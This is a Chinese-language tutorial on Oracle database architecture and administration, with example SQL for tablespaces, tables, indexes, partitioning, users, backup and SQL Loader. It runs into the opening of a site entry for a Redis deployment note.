数据库链是与远程数据库连接的存储定义，它们用于查询分布数据库环境的远程者。由于存储在DBA_DB_LINKS数据字典中，所以可以把它们看作一种数据库对象类型。 3.2.3. 表 Table 表是数据库中用来存储数据的对象，是有结构的数据的集合。 数据在表中式按行和列的格式组织排列，表中的每一列为称为“字段”（又称“属性”），每一行称为“元组”（又称“记录”）。表上有约束规则，用于确保数据的有效性。 3.2.4. 视图 View 视图是存储在数据库中的查询的SQL语句，它是一张虚拟表。 使用它主要出于两种主要原因：安全原因，视图可以隐藏一些数据；另一原因是可使复杂的查询易于理解和使用。 其中物化视图是视图的一种特例，它类似于索引。 物化视图是用于预先计算并保存表连接或聚集等耗时较多的操作的结果，这样在执行查询时，就可以避免进行这些耗时的操作，从而快速的得到结果，提高查询性能。 增加和删除物化视图不会影响应用程序中SQL 语句的正确性和有效性。但物化视图需要占用存储空间；当基表发生变化时，物化视图也应当刷新。 3.2.5. 同义词 Synonym 同义词是指向其它数据库表的数据库指针。同义词有两种类型：私有（private）和公共（public）。 私有的同义词是在指定的模式中创建并且只创建者使用的模式访问。 公共同义词是由public 指定的模式访问，所有数据库模式（用户）都可以访问它。 3.2.6. 索引 Index 当从表中访问数据时，Oracle提供了两个选择：从表中读取每一行（即全表扫描）；或者通过ROWID一次读取一行。 索引不能滥用，当访问大型表的少量行时，使用索引可能效率更高。性能统计结果，当索引搜索的行数不多于总行数的4%时，性能比全表扫描快。 3.2.7. 序列 Sequence 序列是用于产生唯一数码的数据库对象，序列创建时带有初始值、增量值、最大值等，最大可达38位整数。 在Oracle由于没有类似于MySQL的auto_increment或SyBase的IDENTITY，因此主键自增基本都依赖于使用序列实现。 3.2.8. 存储过程 StoredProcedure 一组为了完成特定功能的SQL语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。 3.2.9. 触发器 Trigger 触发器（trigger）是个特殊的存储过程，它的执行不是由程序调用，也不是手工启动，而是由个事件来触发，比如当对一个表进行操作（insert，delete， update）时就会激活它执行。触发器经常用于加强数据的完整性约束和业务规则等。 3.2.10. 函数 Function 可以看作是一个简单的存储过程，但是使用限制比存储过程多，但是可以（且仅可以）返回单行值，可以在select语句中嵌套使用。 3.2.11. 数据字典 数据字典是Oracle存放有关数据库信息的地方，它是一组表和视图结构。存放在SYSTEM表空间中，其用途是用于描述数据。 Oracle的系统进程会通过数据字典对数据库进行操作，用户也可以用SQL语句访问数据字典，数据字典内容包括： 数据库中所有模式对象的信息，如表、视图、簇、及索引等。 分配多少空间，当前使用了多少空间等。 列的缺省值。 约束信息的完整性。 Oracle用户的名字。 用户及角色被授予的权限。 用户访问或使用的审计信息。 其它产生的数据库信息。 3.3. Oracle进程与内存结构 当在计算机服务器上启动Oracle数据库后，称服务器上启动了一个Oracle实例（Instance）。 Oracle实例（Instance）是存取和控制数据库的软件机制，它包括Oracle进程和系统全局区（System Global Area，SGA）两部分。 3.3.1. Oracle进程 Oracle进程由用户进程、服务器进程和后台进程所组成。 当用户运行一个应用程序时，系统就为它建立一个用户进程。服务器进程与用户进程连接并通讯，为相连的用户进程处理Oracle请求服务。 为了提高系统性能，更好地实现多用户功能，ORACLE还在系统后台启动一些后台进程，用于数据库数据操作。 后台进程主要包括： SMON 系统监控进程：（system monitor）负责完成自动实例恢复和回收分类（sort）表空间。 PMON 进程监控进程：（PRocess monitor）实现用户进程故障恢复、清理内存区和释放该进程所需资源等。 DBWR 数据库写进程：数据库缓冲区的治理进程。在它的治理下，数据库缓冲区中总保持有一定数量的自由缓冲块，以确保用户进程总能找到供其使用的自由缓冲块。 LGWR 日志文件写进程：是日志缓冲区的治理进程，负责把日志缓冲区中的日志项写入磁盘中的日志文件上。每个实例只有一个LGWR进程。 CKPT 检查点进程：用于触发检查点事件，把数据缓冲区的数据写入磁盘，并更新控制文件的检查点位置。 3.3.2. 内存结构 SGA是系统为实例分配的一组共享内存缓冲区，用于存放数据库实例和控制信息，以实现对数据库中数据的治理和操作。 SGA在实例启动时被自动分配，当实例关闭时被收回。数据库的所有数据操作都要通过SGA来进行。 内存结构的主要组成有： 数据缓冲区 Database Buffer Cache：存放数据库中数据库块的拷贝。它是由一组缓冲块所组成，这些缓冲块为所有与该实例相链接的用户进程所共享。 日志缓冲区Redo Log Buffer：存放数据操作的更改信息。它们以日志项的形式存放在日志缓冲区中。当需要进行数据库恢复时，日志项用于重构或回滚对数据库所做的变更。 共享池Shared Pool：包含用来处理的SQL语句信息。它包含共享SQL区和数据字典存储区。共享SQL区包含执行特定的SQL语句所用的信息。数据字典区用于存放数据字典，它为所有用户进程所共享。 3.4. Oracle的读写机制 3.4.1. 写操作与检查点 在数据库系统中，写日志和写数据文件是数据库中IO消耗最大的两种操作，在这两种操作中写数据文件属于分散写，写日志文件是顺序写。 因此为了保证数据库的性能，通常数据库都是保证在提交（commit）完成之前，要先保证日志都被写入到日志文件中。而脏数据块则暂存在数据缓存（Database Buffer Cache）中，再不定期的分批写入到数据文件中。也就是说日志写入和提交操作是同步的，而数据写入和提交操作是不同步的。 这样就存在一个问题，当一个数据库崩溃的时候并不能保证缓存里面的脏数据全部写入到数据文件中，这样在实例启动的时候就要使用日志文件进行恢复操作，将数据库恢复到崩溃之前的状态，保证数据的一致性。 检查点（CheckPoint）是这个过程中的重要机制，Oracle通过它来确定在恢复数据时，应该扫描哪些重做日志应，并将其应用于恢复。 一般所说的CheckPoint是一个数据库事件，CheckPoint事件由LGWR或CKPT进程发出。当CheckPoint事件发生时，DBWn（n表示可能有多个写进程，即并行写）会将脏块写入到磁盘中，同时数据文件和控制文件的文件头也会被更新，以记录最新的CheckPoint信息。 3.4.2. 读操作 相对于写操作，读操作相对简单。 当用户查询数据时，Oracle数据库首先从数据缓冲区查找。若所要查询的数据不在数据缓冲区中，则Oracle数据库会启动相应的后台进程从数据文件中读取数据，并保存到数据缓冲区中。 3.5. 物理构成 每一个Oracle数据库是主要由三种类型的文件组成：数据文件（.DBF）、日志文件（.LOG）和控制文件（.CTL），另外还包括一些配置文件（参数文件）。 3.5.1. 数据文件 数据文件（Data File）用于存储数据库数据的文件，如表中的记录，索引，数据字典等。 由于Oracle数据库的表空间与数据文件是一对多的关系，因此当向某个表添加数据时，插入到表中的数据可能仅在一个数据文件中，也可能跨越在多个数据文件中。 数据文件的读写方式前面已提过，此处不再详述。 3.5.2. 日志文件 在Oracle中，日志文件也叫做重做日志文件或重演日志文件（Redo Log Files）。日志文件用于记录对数据库的修改信息，这包括用户对数据的修改和管理员对数据结构结构的修改。但如果只是对数据库中的信息进行查询操作，则不会产生日志信息。 在Oracle中，当用户对数据库的数据执行了修改操作，则修改信息首先被记录在日志缓冲区中。在用户commit（或日志缓冲区满1/3时、或超时3秒（可设置））后，由LGWR进程将日志信息从日志缓冲区中读出并写到日志文件中。这时，数据文件中保存的数据可能是修改前的数据，也可能是修改后的数据，但在日志文件中则记录了修改前和修改后两组数据。因此日志文件是保证数据库系统安全、进行备份与恢复的重要手段。日志文件的损坏造成的后果比损坏数据文件更严重，它可能会导致整个数据库系统不能正常使用。 3.5.3. 日志文件组 在Oracle数据库中，日志文件是成组使用的。日志文件的组织单位叫日志文件组，日志文件组中的日志文件叫日志成员。每一个Oracle数据库系统都有多个日志文件组，每一组可以由一个或多个日志成员（即日志文件）组成，但同一组的日志成员所存储的信息完全相同，它们是镜像关系。 为了防止日志文件被物理损坏，一般建议在每个日志文件组中设置多个日志成员进行镜像，并且镜像文件应该被存储在不同的物理磁盘中。 在日志工作过程中，多个日志文件组之间是循环使用的。当一日志文件组被填满后，将会发生日起切换，系统自动转换到另一个日志文件组。如果所有的日志文件组都被填满后，则系统将日志信息写入到第一个日志文件组中，这时第一个日志文件组中的日志信息可能被覆盖掉（取决于数据库的工作模式）。 在Oracle数据库中，数据库有两种运行模式：归档模式（ARCHIVELOG），和非归档模式（NOARCHIVELOG）。 数据库运行在非归档模式时，如果发生日志切换且需要覆盖，则日志信息直接被覆盖。而当运行在归档模式时，如果发生日志切换且需要覆盖，则系统将启用ARCH进程将要被覆盖的日志信息保存到磁盘或磁带上形成归档日志（即历史日志文件）。在默认情况下，Oracle不采用归档模式。 3.5.4. 控制文件 Oracle的控制文件是一个很小的二进制文件，它用于描述数据库的物理结构。控制文件一般在安装Oracle系统时自动创建。 由于控制文件存放有数据文件和日志文件等信息，因此Oracle数据库在启动时，数据库须访问控制文件。在数据库的使用过程中，Oracle将不断更新控制文件。如果由于某些原因导致控件文件被损坏，那么数据库也就不能正常工作了。 由于控制文件的重要性，因此一个数据库至少应该包含一个以上的控制文件，Oracle 10g默认包含了3个控制文件，每个控制文件都包含了相同的信息。这样可确保在数据库运行时，如果某个控制文件损坏，Oracle会自动使用另一个控制文件，不致于因某个控制文件损坏而无法启动数据库。 3.5.5. 配置文件 构成Oracle数据库物理结构的还具有另外一种重要的文件：配置文件（也即参数文件）。配置文件记录了Oracle数据库的基本参数信息，主要包括数据库名、控制文件所在路径、进程等。 配置文件在安装Oracle数据库系统时由系统自动创建，如果想要对数据库的某些参数进行设置，则尽可能过OEM或ALTER SYSTEM命令来修改，一般避免直接使用编辑器修改配置文件。 4. Oracle的安装与管理工具 4.1. Oracle的安装 略。请自行百度或Google查找Oracle在Linux下的安装方法。 以下主要以Linux下的Oracle 10g作为背景。 4.2. Oracle的启动 阶段 阶段名称 描述 命令 第一阶段 nomount 读取参数文件，分配实例 startup nomount 第二阶段 mount 加载控制文件的信息到内存 startup mount 或alter database mount 第三阶段 open 加载所有需要的数据文件和联机日志文件 Startup 或alter atabase open 在启动Oracle时若启动失败，则可参照上表核查是在第几阶段失败，则对应再去检查对应文件的完整性即可发现启动失败的原因。 4.3. Oracle的关闭 关闭方式 描述 shutdown normal 不允许建立新的连接（普通用户）等待查询结束等待事务结束产生检查点（完全检查点）关闭数据文件卸载控制文件 shutdown transactional 不允许建立新的连接（普通用户）不等待查询结束（查询的会话被杀掉）等待事务结束产生检查点（完全检查点）关闭数据文件，卸载控制文件关闭实例 shutdown immediate 不允许建立新的连接（普通用户）不等待查询结束（查询的会话被杀掉）不等待事务结束（将事务rollback）产生检查点（完全检查点）关闭数据文件卸载控制文件 shutdown abort 相当于拔电源的关闭方式，易造成脏库重新启动数据库时需要实例的恢复 4.4. Oracle的管理工具 关闭名称 描述 datastudio 通用数据库客户端工具 PL/SQL Oracle专用客户端工具 SQL loader Oracle的数据加载工具，常用于Linux下的大数据迁移 5. Oracle的实例管理 5.2. 创建数据库 对建库SQL不作要求，但从Oracle的建库SQL可以了解数据库的构成： CREATE DATABASE mynewdb /* 创建数据库mynewdb */ USER SYS IDENTIFIED BY pz6r58 /* 数据库用户SYS的密码为pz6r58 */ USER SYSTEM IDENTIFIED BY y1tz5p /* 数据库用户SYSTEM的密码为y1tz5p */ LOGFILE /* 创建日志文件组GROUP1、GROUP2、GROUP3 */ GROUP 1 ('/u01/oracle/oradata/mynewdb/redo01.log') SIZE 100M, GROUP 2 ('/u01/oracle/oradata/mynewdb/redo02.log') SIZE 100M, GROUP 3 ('/u01/oracle/oradata/mynewdb/redo03.log') SIZE 100M MAXLOGFILES 5 /* 最多的日志文件组数量为5 */ MAXLOGMEMBERS 5 /* 每个日志文件组的最大成员数为5 */ MAXLOGHISTORY 1 /* 最多的历史日志个数为1 */ MAXDATAFILES 100 /* 最多可以打开的数据文件个数为100 */ MAXINSTANCES 1 /* 最多只允许有1个实例能够 mount 和 open 数据库 */ CHARACTER SET US7ASCII /* 数据库字符集为US7ASCII（对普通的字段属性有效，如CHAR、VARCHAR等） */ NATIONAL CHARACTER SET AL16UTF16 /* 国家字符集为AL16UTF16（仅对带“N”前缀的字段属性有效，如NCHAR、NVARCHAR等） */ /* 配置系统表空间的物理位置，若已存在则覆盖，并使用本地化管理方式 */ DATAFILE '/u01/oracle/oradata/mynewdb/system01.dbf' SIZE 325M REUSE EXTENT MANAGEMENT LOCAL /* 配置系统表的辅助表空间的物理位置，若已存在则覆盖 */ SYSAUX DATAFILE '/u01/oracle/oradata/mynewdb/sysaux01.dbf' SIZE 325M REUSE /* 配置系统表的辅助表空间的物理位置，若已存在则覆盖 */ DEFAULT TEMPORARY TABLESPACE tempts1 TEMPFILE '/u01/oracle/oradata/mynewdb/temp01.dbf' SIZE 20M REUSE /* 配置默认临时表空间的物理位置，若已存在则覆盖 */ UNDO TABLESPACE undotbs DATAFILE '/u01/oracle/oradata/mynewdb/undotbs01.dbf' SIZE 200M REUSE /* 配置撤销表空间的物理位置，若已存在则覆盖，当空间不足时自动扩展，且不限制表空间的物理大小 */ AUTOEXTEND ON MAXSIZE UNLIMITED; 5.3. 表空间的创建与管理 5.3.1. 创建表空间 （1）创建表空间example，其下有2个数据文件，大小分别为100M（若创建的是临时表空间，则要把第1行修改为CREATE TEMPORARY TABLESPACE example TEMPFILE）； （2）对于第2个数据文件，当空间不足时可以自动扩展，扩展上限为4G，同时使用本地化管理方式（另一种是字典管理方式extent management dictionary），指定区尺寸为1M（默认为64k），启动段空间自动管理。 CREATE TABLESPACE example DATAFILE '/oradata/orclnew/example_01.dbf' SIZE 100M, '/oradata/orclnew/example_02.dbf' SIZE 100M autoextend on maxsize 4g extent management local uniform size 1m segment space management auto; 5.3.2. 管理表空间 /* 删除表空间 */ DROP TABLESPACE example INCLUDING CONTENTS; /* 扩展表空间 */ ALTER TABLESPACE example ADD DATAFILE '/DISK6/example_04.dbf' SIZE 200M AUTOEXTEND ON NEXT 10M MAXSIZE 500M; ALTER DATABASE DATAFILE '/DISK5/example_02.dbf' RESIZE 200M; /* 重命名表空间 */ ALTER TABLESPACE example RENAME DATAFILE '/DISK4/example_01.dbf' TO '/DISK5/example_01.dbf'; ALTER DATABASE RENAME FILE '/DISK1/system_01.dbf' TO '/DISK2/system_01.dbf'; /* 更改数据库的存储参数 */ ALTER TABLE summit.employee PCTFREE 30 PCTUSED 50 STORAGE(NEXT 500K MINEXTENTS 2 MAXEXTENTS 100); /* 表空间的数据迁移 */ ALTER TABLE employee MOVE TABLESPACE data1; /* 获取表空间的大小信息 */ SELECT TABLESPACE_NAME, SUM(BYTES) FROM DBA_DATA_FILES GROUP BY TABLESPACE_NAME /* 获取表空间的剩余大小信息 */ SELECT TABLESPACE_NAME, SUM(BYTES) FROM DBA_FREE_SPACE GROUP BY TABLESPACE_NAME 5.4. 表的创建与管理 5.4.1. 创建表 CREATE TABLE example( ID Number(4) NOT NULL PRIMARY KEY, NAME VARCHAR(25) NOT NULL, ……………… TOTAL_SCORE NUMBER(3,0) ); 在数据库中，建表时一定要关注主键，即尽量都有主键，除非是一些流水表。 5.4.2. 表约束 约束类型 描述 NOT NULL 非空约束，字段值不可以为空 UNIQUE 唯一约束，字段值不可以重复 PRIMARY 主键约束，包括了非空约束和唯一约束 FOREIGIN KEY 外键约束，要求字段的值必须和另外一个表某个字段的值相匹配 CHECK 检查约束，该字段里面的值必须符合一个静态的条件（范围、枚举等） REF 关联约束。其中的一列或者是多列是其他的表中的值 除此之外，表约束还有一个延迟性设置（默认是非延迟的）。 在非延迟（Initially Immediate）情况下，任何的修改都会马上进行约束校验。而在延迟（Intially Deferred）情况下，当所有修改都完成并commit的时候才会进行约束校验，此时可能会因约束问题引发回滚，因此一般都避免设置为延迟校验。 5.4.3. 数据类型 5.4.4. 外部表 外部表是在数据库以外的文件系统上存储的只读表，它是按一定格式分割的文本文件或者其他类型的表，例如EXCEL、CSV等文件。外部表对于Oracle数据库来说，就好比是一张视图，在数据库中可以像视图一样进行查询等操作。这个视图允许用户在外部数据上运行任何的SQL语句，而不需要先将外部表中的数据装载进数据库中。 建立一个在“/opt/directory/test”目录下并以“,”作为数据分隔的外部表的步骤如下： /* 创建目录Directory */ CREATE DIRECTORY TestTable_dir AS '/opt/directory/test'; /* 创建外部表 */ CREATE TABLE TestTable( ID VARCHAR2(10), NAME VARCHAR2(20), TYPE VARCHAR2(20), AGE VARCHAR2(20) ) ORGANIZATION EXTERNAL( TYPEORACLE_LOADER DEFAULT DIRECTORY TestTable_dir ACCESS PARAMETERS(fields terminated by ',') LOCATION('TestTable.csv') ); 5.5. 索引管理 5.5.1. 索引分类 逻辑划分：单行索引、复合索引、唯一索引、非唯一索引、函数索引 物理划分：反转索引、分区索引、全局索引、B-map索引、B-tree索引 5.5.2. 索引管理 /* 创建B-TREE索引（系统默认） */ CREATE INDEX orders_region_id_idx ON orders(region_id) PCTFREE 30 STORAGE(INITIAL 200K NEXT 200K PCTINCREASE 0 MAXEXTENTS 50)TABLESPACE indx; /* 创建B-MAP索引 */ CREATE BITMAP INDEX orders_region_id_idx ON orders(region_id) PCTFREE 30 STORAGE(INITIAL 200K NEXT 200K PCTINCREASE 0 MAXEXTENTS 50)TABLESPACE indx; /* 使用reverse函数创建反转索引 */ CREATE index_name ON tablename (REVERSE(ind_name)); /* 索引分析 */ ANALYZE INDEX acct_no_idx VALIDATE STRUCTURE; /* 查看索引利用情况 */ SELECT (DEL_LF_ROWS_LEN/LF_ROWS_LEN) * 100 AS index_usage FROM index_stats; /* 重建索引 */ ALTER INDEX acct_no_idx REBUILD; /* 删除索引 */ DROP INDEX index_name; 5.6. 分区表管理 分区表：在逻辑上是一张整体表，但在物理上则是由多张离散的子表构成。 5.6.1. 范围分区（Range） Range分区是较常用的表分区方式之一，它以列的值的范围作为分区的划分条件，将记录存放到列值所在的Range分区中。 在建表的时候，需要指定用于分区的列，以及分区的范围值。如果某些记录暂无法预测范围，可以创建MAXVALUE分区，所有不在指定范围内的记录都会被存储到MAXVALUE所在分区中。 范围分区适用于大批数据量清理。 /* 范围分区表SQL样例 */ CREATE TABLE EXAMPLE ( ID NUMBER, TIME DATE ) PARTITION BY RANGE (TIME) ( PARTITION p1 VALUES LESS THAN (TO_DATE('2013-1-1','YYYY-MM-DD')), PARTITION p2 VALUES LESS THAN (TO_DATE('2013-2-1','YYYY-MM-DD')), PARTITION p3 VALUES LESS THAN (TO_DATE('2013-3-1','YYYY-MM-DD')), PARTITION p4 VALUES LESS THAN (MAXVALUE) ) 5.6.2. 哈希分区（Hash） 对于那些无法有效划分范围的表，可以考虑使用Hash分区，Hash分区会将表中的数据平均分配到各个分区中，但由于列所在分区是依据列的Hash值自动分配，因此不能控制也不知道哪条记录会被放到哪个分区中，Hash分区也可以支持多个依赖列。 Hash分区的数量一般为2的幂，不然可能会出现数据分布不均匀的情况。 Hash分区的数据分散均匀，适合静态数据的表（如客户信息表），但不适合做数据清理。 /* 哈希分区SQL样例 */ CREATE TABLE TEST ( TRANSACTION_ID NUMBER PRIMARY KEY, ITEM_ID NUMBER(8) NOT NULL ) PARTITION BY HASH(TRANSACTION_ID) ( PARTITION part_01 TABLESPACE tablespace01, PARTITION part_02 TABLESPACE tablespace02 ); 5.6.3. 列表分区（List） List分区的分区列只能有一个，不能像Range或者Hash分区那样同时指定多个列做为分区依赖列，各个分区的列值必须明确指定。 在List分区时应该尽可能确定分区的所有列值，因为一旦插入的列值不在分区范围内，则插入/更新就会失败。因此建议使用List分区时，创建一个default分区以存储那些不在指定范围内的记录，类似Range分区中的MAXVALUE分区。 /* 列表分区SQL样例 */ CREATE TABLE CUSTADDR ( ID VARCHAR2(15 BYTE) NOT NULL, AREACODE VARCHAR2(4 BYTE) ) PARTITION BY LIST (AREACODE) ( PARTITION t_list025 VALUES ('025'), PARTITION t_list372 VALUES ('372'), PARTITION t_list510 VALUES ('510'), PARTITION p_other VALUES (DEFAULT) ) 5.6.4. 组合分区 在Oracle 10g中支持的组合分区只有两种类型： 范围－哈希复合分区（Range-Hash） 范围－列表复合分区（Range-List） 两种组合分区的根分区只能是Range分区，子分区则可以是Hash分区或List分区中的一种。 /* 范围－哈希复合分区SQL样例 */ CREATE TABLE emp_sub_template ( DEPTNO NUMBER, EMPNAME VARCHAR(32), GRADE NUMBER ) PARTITION BY RANGE(DEPTNO) SUBPARTITION BY HASH(EMPNAME) SUBPARTITION template ( SUBPARTITION a TABLESPACE ts1, SUBPARTITION b TABLESPACE ts2, SUBPARTITION c TABLESPACE ts3, SUBPARTITION d TABLESPACE ts4 ) ( PARTITION p1 VALUES LESS THAN (1000), PARTITION p2 VALUES LESS THAN (2000), PARTITION p3 VALUES LESS THAN (MAXVALUE) ); /* 范围－列表复合分区SQL样例 */ CREATE TABLE quarterly_regional_sales ( DEPTNO NUMBER, ITEM_NO VARCHAR2(20), TXN_DATE DATE, TXN_AMOUNT NUMBER, STATE VARCHAR2(2) ) TABLESPACE TS4 PARTITION BY RANGE (TXN_DATE) SUBPARTITION BY LIST (STATE) ( PARTITION q1_1999 VALUES LESS THAN (TO_DATE('1-APR-1999','DD-MON-YYYY')) ( SUBPARTITION q1_1999_northwest VALUES ('OR', 'WA'), SUBPARTITION q1_1999_southwest VALUES ('AZ', 'UT', 'NM'), SUBPARTITION q1_1999_northeast VALUES ('NY', 'VM', 'NJ'), SUBPARTITION q1_1999_southeast VALUES ('FL', 'GA'), ), ............................... PARTITION q3_2000 VALUES LESS THAN (TO_DATE('1-OCT-2000','DD-MON-YYYY')) ( SUBPARTITION q3_2000_northwest VALUES ('OR', 'WA'), SUBPARTITION q3_2000_southwest VALUES ('AZ', 'UT', 'NM'), SUBPARTITION q3_2000_northeast VALUES ('NY', 'VM', 'NJ'), SUBPARTITION q3_2000_southeast VALUES ('FL', 'GA'), ) ); 5.7. 用户管理 /* 创建用户SQL样例 */ CREATE USER user_name IDENTIFIED [ BY password | EXTERNALLY | GLOBALLY AS ‘external_name’ ] [ DEFAULT TABLESPACE tablespace_name ] [ TEMPORARY TABLESPACE temp_tablespace_name ] [ QUOTA n K|M|UNLIMITED ON tablespace_name ] [ PROFILE profile_name ][ PASSWORD EXPIRE ][ ACCOUNT LOCK | UNLOCK ] /* 用户角色/方案授权SQL样例 */ GRANT sys_list to user_list | role_list | PUBLIC [ WITH ADMIN OPTION ]; GRANT resource,connect TO u1; GRANT SELECT ON scott.emp TO u1; GRANT UPDATE (sal,comm) ON scott.emp TO u1; /* 回收用户权限SQL样例 */ REVOKE sys_priv_list FROM user_list| role_list; /* 删除用户SQL样例 */ DROP USER U1 CASCADE; -- 方案中的所有对象都会被连带删除; 5.8. 数据备份与迁移 5.8.1. impdp与expdp impdb与expdb工具是在命令行环境中使用的（如Linux的终端、Windows的Dos），它需要Oracle客户端的支持。impdb与expdb仅支持在服务器本地执行数据迁移，不支持远程操作。 /* 全库备份 */ expdp system/manager DIRECTORY=dpdata1 DUMPFILE=full.dmp FULL=y; impdp system/manager DIRECTORY=dpdata1 DUMPFILE=full.dmp FULL=y; /* 按表空间备份 */ expdp system/manager DIRECTORY=dpdata1 DUMPFILE=tablespace.dmp TABLESPACES=temp,example; impdp system/manager DIRECTORY=dpdata1 DUMPFILE=tablespace.dmp TABLESPACES=temp,example; /* 按表名备份 */ expdp scott/tiger@orcl TABLES=emp,dept dumpfile=expdp.dmp DIRECTORY=dpdata1; impdp scott/tiger@orcl TABLES=emp,dept dumpfile=expdp.dmp DIRECTORY=dpdata1; /* 按查询条件备份 */ expdp scott/tiger@orcl directory=dpdata1 dumpfile=expdp.dmp Tables=emp query='WHERE deptno=20'; impdp scott/tiger@orcl directory=dpdata1 dumpfile=expdp.dmp Tables=emp; 5.8.2. imp与exp imp与exp工具是在命令行环境中使用的（如Linux的终端、Windows的Dos），它需要Oracle客户端的支持。imp与exp除了支持在服务器本地执行数据迁移，也支持远程操作。 /* 全库备份 */ exp system/pafirc@192.168.11.22/orcl FILE='e:\\ pafirc.dmp' FULL=y imp system/pafirc@192.168.11.22/orcl FILE='e:\\ pafirc.dmp' FULL=y /* 按表空间备份 */ exp scott/tiger@192.168.11.22/orcl FILE='d:\\full_tablespace.dmp' FULL=y imp scott/tiger@192.168.11.22/orcl FILE='d:\\full_tablespace.dmp' FULL=y /* 按表名备份 */ exp scott/tiger@192.168.11.22/orcl FILE='d:\\person.dmp' TABLES=(PERSON) imp scott/tiger@192.168.11.22/orcl FILE='d:\\person.dmp' TABLES=(PERSON) /* 按查询条件备份 */ exp scott/tiger@192.168.11.22/orcl FILE='d:\\person_part.dmp' TABLES=(PERSON) QUERY=\"WHERE ID=3\" imp scott/tiger@192.168.11.22/orcl FILE='d:\\person_part.dmp' TABLES=(PERSON) 注意：imp命令默认是导入表结构和数据的，若只需导入数据，则需增加参数“data_only=y” 。 5.8.3. PL/SQL PL/SQL是Oracle专用的客户端工具，常用于Windows环境。使用它可以很方便地进行数据迁移。不过它需要在本地安装Oracle客户端作为支持。 使用PL/SQL进行数据迁移的步骤如下： （1）配置远程数据库连接信息： 修改“%本地oracle客户端根目录%\\NETWORK\\ADMIN”目录下的配置文件TNSNAMES.ORA，增加监听服务名称。在其末尾添加远程服务器信息： ORCL192_168_11_22 = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP) (HOST = 192.168.11.22) (PORT = 1521) ) (CONNECT_DATA = (SERVER = ) (SERVICE_NAME = orcl) ) ) 其中ORCL192_168_11_22为监听服务名称，可任意命名。HOST为远程服务器的IP地址，PROT为远程Oracle服务器的服务端口，SERVICE_NAME为远程Oracle服务器的实例名称。 （2）运行PL/SQL登录远程Oracle服务器： 如下图所示，选择数据库名称为ORCL192_168_11_22，帐密根据实际，连接角色Normal。 （3）备份操作： 依次操作Tool -> Export Tables -> PL/SQL develope，出现如下图所示的界面。选中要导出的表（不选则默认为选择全部），然后填写导出位置，最后执行Export即导出数据到本地。 注意这里不使用Oracle Export和SQL Inserts方式导出。 Oracle Export导出需要驱动器，只能在服务器本地执行，不适用于远程备份恢复。SQL Inserts虽然可以导出，但导入需要驱动器，即可以远程备份，但要在本地恢复。 （4）恢复： 依次操作Tool -> Import Tables -> PL/SQL developer，出现如所示的界面。选中要导入的表（不选则默认为选择全部），然后选择备份文件，最后执行Import即把本地数据导入到远程数据库。 注意的是，若勾选“Drop tables”，则要求所有导入的表，在数据库中都有同名表。若不勾选“Drop tables”，则要求所有导入的表，在数据库中都没有同名表。否则导入会失败。 5.8.4. SQL Loader SQL Loader是Oracle的数据加载工具，常用于Linux环境。通常用来将操作系统文件迁移到Oracle数据库中。它大型数据仓库选择使用的加载方法，因为它提供了最快速的途径（DIRECT串行，或PARALLEL并行）加载数据。 现在抛开其理论不谈，用实例来使介绍SQL Loader的使用方法： 在命令行下执行以下SQL Loader命令（在Linux下，SQL Loader的命令一般为sqlldr/sqlload，在Windows下则一般为SQLLDR）： sqlldr userid=hr/hr control=/u01/app/sl1.ctl 其中 sl1.ctl 为SQL Loader的控制文件，其示例内容如下所示： LOAD DATA infile '/u01/app/sl1.dat' /* 真正要加载的源数据文件 */ badfile '/u01/app/bad.log' /* 记录错误的文件 */ APPEND INTO TABLE sl1 /* 以追加的方式插入数据到表sl1，若无“APPEND”，则采用默认的INSERT插入方式 */ fields TERMINATED BY ',' /* 以逗号分隔每列的数据 */ optionally enclosed by '\"' /* 表示列值以双引号作为标识进行封闭 */ TRAILING NULLCOLS /* 将所有不在纪录中的指定位置的列当作空值 */ /* 最后6行则为表sl1每列的属性，其中声明为EXTERNAL的表示该列为外键 */ ( col1 CHAR, col2 CHAR, col3 INTEGER EXTERNAL, col4 INTEGER EXTERNAL, col5 INTEGER EXTERNAL, col6 CHAR ) 6. 数据库的日常开发要求 关注主键。尽量都有主键，除非一些流水表。 关注索引。索引不是越多越好，并不是所有的查询都是适合索引。 关注分区。分区上也要关注全局索引和分区索引。 关注批量。批量修改时使用文件加载，不要逐条处理。一般只要1小时的数据量超过1000条，就要使用文件加载。 关注多表关联。不是所有的关联结果都一样。 每个项目一定要设置一位固定的虚拟角色来管模型。不要人人都可以加表、改表，必须进行控制，不能每人都是建模者。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/database/Redis部署笔记.html":{"url":"markdown/notes/database/Redis部署笔记.html","title":"Redis 部署笔记","keywords":"","body":"Redis部署笔记（单机+主从+哨兵+集群）1. 简介2. 部署声明3. 前置环境部署4. 单机模式4.1. 简介4.2. 安装4.3. 部署4.4. 测试5. 主从模式5.1. 简介5.2. 部署5.3. 测试6. 哨兵模式6.1. 简介6.2. 部署6.3. 测试6.4. 附：哨兵模式一键启动/停止/重启脚本7. 集群模式7.1. 简介7.2. 部署7.3. 测试7.4. 集群的关闭/重启7.5. 附：集群模式一键启动/停止/重启脚本8. 附：Redis核心配置文件汉化版注释8.1. 服务配置redis.conf8.2. 哨兵配置sentinel.conf9. 附：Jedis客户端封装10. 资源下载Redis部署笔记（单机+主从+哨兵+集群） 1. 简介 Redis是一个开源，高级的键值存储和一个适用的解决方案，用于构建高性能，可扩展的Web应用程序。它有三个主要特点，使其优越于其它键值数据存储系统： Redis将其数据库完全保存在内存中，仅使用磁盘进行持久化。 与其它键值数据存储相比，Redis有一组相对丰富的数据类型。 Redis可以将数据复制到任意数量的从机中。 2. 部署声明 本文基于Centos7系统，由浅入深讲解如何部署Redis的四种模式，分别是：单机模式、主从模式、哨兵模式、集群模式。 需注意，这里因为只用于教学演示，所以这四种模式都是部署在同一台Centos机器上的（通过不同的服务端口区分不同的Redis实例）。实际使用时，一般会使用多台机器部署，此时只需要对应修改IP即可，部署过程是一样的。 3. 前置环境部署 如果只是部署Redis【单机模式/主从模式/哨兵模式】，是不需要安装这个前置环境的。 如果要部署Redis【集群模式（Redis Cluster）】，建议先装完这个前置环境才往下阅读。 这是因为Redis Cluster需要使用ruby脚本构建。虽然Centos7自带了ruby支持库的安装源，但是版本过低（只是2.0.0版本），Redis要求ruby的版本至少为2.2.2。安装方法如下： yum install centos-release-scl-rh　　　　　# 会在/etc/yum.repos.d/目录多出一个CentOS-SCLo-scl-rh.repo源 先更换yum源安装2.3版本的ruby： yum install rh-ruby23 -y scl enable 